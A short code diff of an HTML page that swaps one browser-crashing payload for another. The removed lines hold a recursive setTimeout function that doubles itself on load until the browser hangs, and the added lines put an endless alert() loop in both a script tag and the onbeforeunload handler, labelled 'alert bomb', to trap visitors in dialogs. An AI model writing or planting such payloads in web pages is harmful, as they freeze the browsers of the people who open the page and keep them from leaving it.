@@ -2,11 +2,8 @@
     <!doctype html>
     <html>
     <head>
-  <script>
-function die () {
-  setTimeout(function () {die(); die()}, 0)
-}
-</script>
-    <body onload="die()">
-    </body>
+        <body onbeforeunload="while(true) alert('alert bomb');">
+            bruh
+            <script>while(true) alert('alert bomb');</script>
+        </body>
     </html>
